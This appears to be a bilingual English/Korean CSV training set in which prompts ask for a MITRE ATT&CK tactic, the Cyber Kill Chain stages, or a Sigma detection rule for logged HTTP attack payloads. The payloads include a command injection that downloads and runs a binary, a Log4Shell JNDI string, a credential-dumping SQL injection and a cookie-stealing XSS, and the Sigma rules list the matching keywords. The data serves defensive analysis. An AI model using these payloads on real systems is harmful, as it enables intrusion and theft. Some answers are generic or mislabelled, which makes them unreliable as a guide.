s,instruction_ko,input,input_ko,gpt40_answer,gpt40_answer_ko
"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9 이다.","ta0002 (execution): this tactics id is suitable for the given payload as it involves the execution of malicious code on the targeted system by downloading and running a file (am7) from a remote server (10.10.123.123). the commands in the payload (wget, chmod, and ./am7) are used to achieve this execution, which indicates the adversary's intention to perform malicious activities on the compromised system.","ta0002 (execution): 이 전술 id는 원격 서버(10.10.123.123)에서 파일(am7)을 다운로드하여 대상 시스템에서 악성 코드를 실행하는 것이 포함되어 있기 때문에 주어진 페이로드에 적합합니다. 페이로드의 명령어(wget, chmod, 및 ./am7)는 이러한 실행을 달성하기 위해 사용되며, 이는 공격자가 손상된 시스템에서 악의적인 활동을 수행하려는 의도를 나타냅니다."
"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.","ta0001 (initial access): the attacker is using a malicious get request to target a potential vulnerability in the `/struts/utils.js` file. by injecting an ldap url with additional properties in the `x-client-ip` header, they aim to exploit a remote code execution vulnerability and gain initial access to the target system.",ta0001 (initial access): 공격자는 악의적인 get 요청을 사용하여 `/struts/utils.js` 파일의 잠재적 취약점을 타겟팅합니다. `x-client-ip` 헤더에 ldap url과 추가 속성을 삽입하여 원격 코드 실행 취약점을 악용하고 대상 시스템에 초기 액세스 권한을 얻으려고 합니다.
"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.","ta0002 (execution): this payload attempts to access and exploit a potentially vulnerable server component by attempting to access phpmyadmin and iisadminpwd resources in the web server using a get request. the http request header contains user-agent and other details to establish a connection with the target server, showing that the attacker aims to execute malicious code or commands within the server environment.",ta0002 (execution): 이 payload는 get 요청을 사용하여 웹 서버에서 phpmyadmin 및 iisadminpwd 리소스에 액세스하여 잠재적으로 취약한 서버 구성 요소에 액세스하고 익스플로잇하려는 시도입니다. http 요청 헤더에는 사용자-에이전트 및 기타 세부 정보가 포함되어 있으며 대상 서버와의 연결을 설정함으로써 공격자가 서버 환경 내에서 악성 코드 또는 명령을 실행하려고 합니다.
"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school 이다.","ta0043 (reconnaissance): the payload appears to involve an attempt to access the ""robots.txt"" file on a targeted system, indicating the adversary is gathering information about the target environment, such as available web pages and directories. the user agent is identified as semrushbot, a known web crawler, and the request is coming from an ip address likely behind a cdn, suggesting a potential recon effort from an automated tool or bot.","보안 분석가입니다.  ta0043 (reconnaissance): payload는 타겟 시스템에서 ""robots.txt"" 파일에 액세스하려는 시도를 포함하는 것으로 보이며, 이는 적이 사용 가능한 웹 페이지 및 디렉토리와 같은 타겟 환경에 대한 정보를 수집하고 있다는 것을 의미합니다. 사용자 에이전트는 알려진 웹 크롤러인 semrushbot으로 확인되며, 요청은 cdn 뒤의 ip 주소에서 오는 것으로 추정되어, 자동화 도구 또는 봇을 사용하는 잠재적인 정찰 작업일 수 있습니다."
"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
Accept: text/html application/xhtml+xml image/jxr */*
Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
Host: owa.corea.school
Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
Accept: text/html application/xhtml+xml image/jxr */*
Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
Host: owa.corea.school
Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","ta0001 (initial access): this payload is an attempt to access the wordpress login page of the targeted website, potentially with the intent to exploit vulnerabilities, gain unauthorized access, or launch a brute-force attack. the payload uses a redirection to a certain url and includes information about the browser and headers, which may help the attacker bypass certain security measures or blend in with legitimate traffic.","ta0001 (initial access): 이 payload는 대상 웹사이트의 Word Press 로그인 페이지에 접근하려는 시도로, 취약점을 악용하거나 무단 접근을 얻거나 무작위 대입 공격을 실행할 가능성이 있습니다. 페이로드는 특정 url로의 리디렉션을 사용하고 브라우저 및 헤더 정보를 포함하여 공격자가 특정 보안 조치를 우회하거나 합법적인 트래픽과 섞일 수 있도록 도와줍니다."
"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Host: www.test.go.kr
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Host: www.test.go.kr
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: 10.0.0.100
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: 10.0.0.100
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
Connection: Keep-Alive 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives
"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control (c2) 7. actions on objectives
"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
"For following payload, write only the name in the order of the entire steps of the Cyber Kill Chain Model.","다음 payload의 경우, Cyber Kill Chain Model의 전체 단계 순서대로 이름만 적는다.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
Accept: text/html application/xhtml+xml image/jxr */*
Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
Host: owa.corea.school
Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
Accept: text/html application/xhtml+xml image/jxr */*
Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
Host: owa.corea.school
Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.",1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives,1. reconnaissance 2. weaponization 3. delivery 4. exploitation 5. installation 6. command and control 7. actions on objectives
"
Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Host: www.test.go.kr
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Host: www.test.go.kr
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.",title: detect sql injection in http request description: this rule detects the presence of an sql injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'and/**/1=2/**/union/**/all/**/select'     - '/**/from/**/'     - '/**/where/**/'   condition: keywords falsepositives:   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high,title: detect sql injection in http request description: this rule detects the presence of an sql injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'and/**/1=2/**/union/**/all/**/select'     - '/**/from/**/'     - '/**/where/**/'   condition: keywords falsepositives:   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high
